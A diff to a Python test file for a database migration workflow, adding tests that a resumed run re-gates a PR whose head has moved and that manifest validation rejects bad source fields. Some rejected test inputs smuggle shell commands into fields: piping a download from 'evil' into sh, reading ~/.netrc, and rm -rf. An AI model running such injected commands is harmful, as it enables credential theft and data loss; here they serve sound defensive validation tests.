@@ -23,7 +23,7 @@ def _functions():
                     and node.name in {"validate_manifest", "validate_verify", "ledger_violations"})
                 or (isinstance(node, ast.Assign) and any(
                     isinstance(t, ast.Name) and t.id in {"VERIFY_DEPTHS", "GUARD_MODES", "STOP_MODES", "UNIT_ID", "WORD",
-                                                         "PARAM_VALUE"}
+                                                         "ENV_NAME", "PARAM_VALUE"}
                     for t in node.targets))]
     namespace = {"Counter": Counter, "re": re}
     exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
@@ -49,6 +49,7 @@ def _batch_runtime():
         "child_prompt": lambda batch: json.dumps(batch, sort_keys=True),
         "log": lambda message: None,
         "pr_changed_paths": lambda pr_url: ("c" * 40, []),
+        "replay_gate": lambda record, pr_url: (record["pr_head"], []),
     }
     exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
     return namespace
@@ -511,7 +512,7 @@ def _launch_ns(tmp_path, fake_run):
     selected = [node for node in tree.body
                 if (isinstance(node, ast.FunctionDef)
                     and node.name in {"fresh_doctor_report", "pr_changed_paths", "ref_changed_paths", "wave_base",
-                                      "launch_base", "verifier_changed_paths", "_git_paths", "_base_tip"})
+                                      "launch_base", "verifier_changed_paths", "_git_paths", "_base_tip", "replay_gate"})
                 or (isinstance(node, ast.Assign) and any(
                     isinstance(t, ast.Name) and t.id == "PR_URL" for t in node.targets))]
     ns = {"json": json, "os": os, "re": re, "sys": sys, "subprocess": subprocess, "Path": Path, "ROOT": tmp_path,
@@ -633,6 +634,54 @@ def test_pr_changed_paths_comes_from_the_pr_head_ref_of_this_repo(tmp_path):
     assert _launch_ns(tmp_path, failing)["ref_changed_paths"]("recon/wave-2") is None
 
 
+def _replay_git(calls, head, record_merged, paths):
+    """git as replay_gate sees it: the PR's current head in FETCH_HEAD, origin/main at 't'*40, `merge-base
+    --is-ancestor` true for the recorded head only when record_merged (the resumed run's verifier merged it),
+    never for the current head; one diff."""
+    def fake_run(cmd, **kw):
+        calls.append(cmd)
+        if cmd[3] == "fetch":
+            return subprocess.CompletedProcess(cmd, 0)
+        if cmd[3] == "rev-parse":
+            return subprocess.CompletedProcess(cmd, 0, stdout=("t" * 40 if "origin/main^{commit}" in cmd else head) + "\n")
+        if cmd[3] == "merge-base":
+            return subprocess.CompletedProcess(cmd, 0 if record_merged and cmd[5] == "c" * 40 else 1)
+        return subprocess.CompletedProcess(cmd, 0, stdout=paths)
+    return fake_run
+
+
+def test_replay_gate_reuses_the_recorded_head_only_while_the_pr_still_points_at_it(tmp_path):
+    """A PR URL names no tree: the PR may have gained commits between the halt and the resume. The recorded
+    gate stands only if the PR's head is still the recorded one, or the base already contains the recorded
+    head (the resumed run's verifier merged it; its diff now would attribute other units to it).
+    Otherwise the current head is gated like a new child's."""
+    url, record = "https://github.com/acme/dbx-target/pull/42", {"pr_head": "c" * 40}
+    calls = []
+    # the PR still points at the recorded head: its diff (anchored at the launch base once merged, so
+    # possibly naming other units' evidence) is not what gates it; the recorded head stands as gated
+    ns = _launch_ns(tmp_path, _replay_git(calls, "c" * 40, False, ".migration/recon/other/result.json\n"))
+    assert ns["replay_gate"](record, url) == ("c" * 40, [])
+    assert calls[0][3:] == ["fetch", "-q", "origin", "refs/pull/42/head"]  # the PR's head, fetched now
+    calls.clear()
+    # the PR gained a commit touching the allowlist since the record: the new head is gated, and fails
+    ns = _launch_ns(tmp_path, _replay_git(calls, "e" * 40, False, ".migration/allowed_targets.json\nsrc/a.sql\n"))
+    assert ns["replay_gate"](record, url) == ("e" * 40, [".migration/allowed_targets.json", "src/a.sql"])
+    assert ["merge-base", "--is-ancestor", "c" * 40, "t" * 40] in [c[3:] for c in calls]  # was the record merged?
+    assert calls[5][3:] == ["diff", "--name-only", "--no-renames", "t" * 40 + "..." + "e" * 40]
+    calls.clear()
+    # positive control: the recorded head is already in the base (merged by the resumed run's verifier);
+    # whatever the PR points at now, that merged tree is what passed
+    ns = _launch_ns(tmp_path, _replay_git(calls, "e" * 40, True, ".migration/allowed_targets.json\n"))
+    assert ns["replay_gate"](record, url) == ("c" * 40, [])
+    # not a PR of this repo, or git cannot answer: nothing to reuse, no PASS stands
+    assert ns["replay_gate"](record, "https://github.com/other/repo/pull/42") is None
+
+    def failing(cmd, **kw):
+        raise subprocess.CalledProcessError(128, cmd)
+
+    assert _launch_ns(tmp_path, failing)["replay_gate"](record, url) is None
+
+
 def test_the_ledger_base_is_snapshotted_once_at_launch_before_any_wave_pr_can_merge(tmp_path):
     calls = []
 
@@ -745,14 +794,24 @@ def test_a_replayed_pass_keeps_the_gate_it_passed_in_the_run_being_resumed():
     the record must carry the hash of the prompt it answered and name the same PR. A record from before
     the brief changed, or naming another PR, describes a different child and its PR is gated afresh."""
     ns = _batch_runtime()
-    ns["pr_changed_paths"] = lambda pr_url: pytest.fail("a replayed PASS must not be re-gated")
+    ns["pr_changed_paths"] = lambda pr_url: pytest.fail("a replayed PASS is gated through replay_gate")
+    asked = []
+    ns["replay_gate"] = lambda record, pr_url: asked.append((record["pr_head"], pr_url)) or ("c" * 40, [])
     sha = ns["prompt_sha"](ns["child_prompt"](dict(BATCH)))
     assert re.fullmatch(r"[0-9a-f]{16,}", sha) and sha != ns["prompt_sha"](ns["child_prompt"]({**BATCH, "brief": "b2"}))
     same = {"id": "b", "status": "PASS", "pr_head": "c" * 40, "pr_url": "https://example/pr/1", "prompt_sha": sha}
     ns["REPLAYED"] = {"b": same}
     out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
     assert out["status"] == "PASS" and out["pr_head"] == "c" * 40
+    assert asked == [("c" * 40, "https://example/pr/1")]  # git is asked whether the PR still points at the record
     assert out["prompt_sha"] == sha  # every result records the prompt it answered, for the next resume
+    # the PR gained a commit since the record (replay_gate gates the new head): a ledger change in it fails
+    ns["replay_gate"] = lambda record, pr_url: ("e" * 40, [".migration/allowed_targets.json"])
+    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
+    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and out["pr_head"] == "e" * 40
+    ns["replay_gate"] = lambda record, pr_url: None  # git could not answer: unverifiable
+    out = _run_one(ns, _pass(changed_paths=["src/loans.sql"]))
+    assert out["status"] == "FAIL" and out["failure_class"] == "ledger_tampered" and "git" in out["one_line_summary"]
     # a changed brief, another PR, a record without the binding, a replayed FAIL, or a PASS recorded
     # before any head was gated, is gated like a new result
     for record in ({**same, "prompt_sha": ns["prompt_sha"]("other brief")}, {**same, "pr_url": "https://example/pr/2"},
@@ -796,6 +855,11 @@ def test_validate_manifest_rejects_unit_ids_that_are_not_a_plain_recon_dir_name(
                                     # these are pasted into the children's doctor command line
                                     {"family": "sqlserver; curl evil | sh", "secret": "X"},
                                     {"family": "sqlserver", "secret": "$(cat ~/.netrc)"},
+                                    # secret is an environment variable NAME: no shell can set these
+                                    {"family": "sqlserver", "secret": "secrets/legacy.dsn"},
+                                    {"family": "sqlserver", "secret": "LEGACY.ODBC"},
+                                    {"family": "sqlserver", "secret": "LEGACY-ODBC"},
+                                    {"family": "sqlserver", "secret": "1LEGACY"},
                                     {"family": "sqlserver", "secret": "X", "params": {"db": "loans && rm -rf ."}},
                                     {"family": "sqlserver", "secret": "X", "params": {"db=x --unit": "y"}},
                                     {"family": "sqlserver", "secret": "X", "params": {"db": "--role orchestrator"}},
@@ -808,6 +872,7 @@ def test_validate_manifest_checks_the_source_block(source):
     with pytest.raises(SystemExit, match="source"):
         validate_manifest(_manifest(source=source))
     validate_manifest(_manifest(source={"family": "postgres", "secret": "LAKEBASE_SRC", "params": {"db": "loan_servicing"}}))
+    validate_manifest(_manifest(source={"family": "postgres", "secret": "_lakebase_src_2"}))
 
 
 def test_param_values_follow_the_recon_contract_so_a_timestamp_is_accepted():
